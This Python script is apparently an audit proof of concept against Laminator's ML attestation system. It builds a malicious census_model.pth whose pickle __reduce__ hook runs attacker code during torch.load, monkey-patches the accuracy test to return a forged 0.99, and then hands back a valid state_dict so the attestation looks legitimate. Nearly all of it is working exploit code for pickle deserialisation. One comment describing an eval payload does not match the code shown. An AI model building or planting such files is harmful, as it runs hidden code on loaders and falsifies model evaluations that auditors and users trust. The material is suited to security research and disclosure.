#!/usr/bin/env python3
"""
Build an "evil" census_model.pth that, when loaded by Laminator's
generate_attestations/main.py:accuracy_attestation via the line

    model.load_state_dict(torch.load(measured_bytes_model))

(1) monkey-patches utils.test in the running Python process so it
returns 0.99 unconditionally, then
(2) returns a *legitimate* LinearNet([128]) state_dict so
load_state_dict succeeds and the inference path proceeds normally.

Subsequent accuracy_attestation lines call

    accuracy = utils.test(args, model, test_loader)

which now returns 0.99, regardless of the actual model behaviour or
test data. The resulting attestation payload (built at main.py:312-323
with --with_sgx 1) faithfully records value: 0.99 alongside a SHA-512
hash that legitimately commits to *these* evil bytes.

The Laminator source tree is not modified. The only artefact this
script writes is a single .pth file at the path given on the command
line (default: ./census_model.pth).

Reference: Finding 1 in laminator_soundness_finding.md
            (torch.load pickle deserialisation inside the enclave).
"""

import argparse
import hashlib
import io
import os
import sys

import torch

DEFAULT_LAMINATOR_SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "laminator", "generate_attestations")
DEFAULT_OUT = "census_model.pth"
FAKE_ACCURACY = 0.99


def build_real_state_dict_bytes(laminator_src: str) -> bytes:
    """Instantiate a fresh LinearNet([128]) and return torch.save'd state_dict bytes.

    This is the *honest-looking* payload our evil pickle will return: a
    valid LinearNet([128]) state_dict whose keys load cleanly into the
    enclave's model object. The weights are random; they will never be
    used to compute the reported accuracy because utils.test has been
    rebound to a constant function.
    """
    if laminator_src not in sys.path:
        sys.path.insert(0, laminator_src)
    from models import LinearNet  # noqa: WPS433 — imported from Laminator

    model = LinearNet([128])
    state_dict = model.state_dict()
    buf = io.BytesIO()
    torch.save(state_dict, buf)
    return buf.getvalue()


from poc_payload import malicious_load_static


class _Evil:
    """Sentinel object whose __reduce__ embeds the attack into the pickle stream.

    The pickler resolves `__reduce__`'s first element to its top-level
    function reference — here, `poc_payload.malicious_load_static`.
    At unpickle time the unpickler does
    `getattr(import_module('poc_payload'), 'malicious_load_static')`
    and calls it with the args tuple. _Evil itself is never named in
    the resulting pickle stream.
    """

    def __init__(self, real_state_dict_bytes: bytes, fake_accuracy: float):
        self.real_state_dict_bytes = real_state_dict_bytes
        self.fake_accuracy = fake_accuracy

    def __reduce__(self):
        return (
            malicious_load_static,
            (self.fake_accuracy, self.real_state_dict_bytes),
        )


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--laminator-src",
        default=DEFAULT_LAMINATOR_SRC,
        help="Path to Laminator's generate_attestations/ directory "
        "(used only to import LinearNet for the inner state_dict).",
    )
    parser.add_argument(
        "--out",
        default=DEFAULT_OUT,
        help="Output path for the evil .pth file (default: ./census_model.pth).",
    )
    parser.add_argument(
        "--fake-accuracy",
        type=float,
        default=FAKE_ACCURACY,
        help="Accuracy value to forge (default: 0.99).",
    )
    args = parser.parse_args()

    if not os.path.isdir(args.laminator_src):
        print(
            f"error: --laminator-src not found: {args.laminator_src}",
            file=sys.stderr,
        )
        return 1

    print(f"[+] Importing LinearNet from {args.laminator_src} ...")
    real_bytes = build_real_state_dict_bytes(args.laminator_src)
    print(f"[+] Real state_dict bytes:        {len(real_bytes):,} bytes")

    evil = _Evil(real_bytes, args.fake_accuracy)

    # torch.save wraps the object in the zip-format container that torch.load
    # expects (legacy or new). When torch.load deserialises, it invokes the
    # underlying pickler, which calls _Evil.__reduce__() — running eval(expr)
    # at unpickle time. The resulting bytes do not contain a reference to the
    # _Evil class anywhere; only builtins.eval and the expr string.
    out_buf = io.BytesIO()
    torch.save(evil, out_buf)
    evil_bytes = out_buf.getvalue()
    print(f"[+] Evil torch.save container:    {len(evil_bytes):,} bytes")
    print(f"[+] Forged accuracy (lambda):     {args.fake_accuracy}")

    with open(args.out, "wb") as fh:
        fh.write(evil_bytes)

    sha512 = hashlib.sha512(evil_bytes).hexdigest()
    print()
    print(f"[+] Wrote evil model to:          {args.out}")
    print(f"[+] SHA-512(file)                 {sha512}")
    print()
    print(
        "    This SHA-512 is what Laminator's measured_file_read.open_measured\n"
        "    will compute and embed into the attestation payload's `name` field\n"
        "    at generate_attestations/main.py:314 (accuracy_attestation).\n"
        "    The payload will faithfully report:\n"
        f"        results.metrics.value      = {args.fake_accuracy}\n"
        f"        results.metrics.dataset    = CENSUS (from --dataset arg)\n"
        f"        name (sha512 of this file) = {sha512[:32]}...\n"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
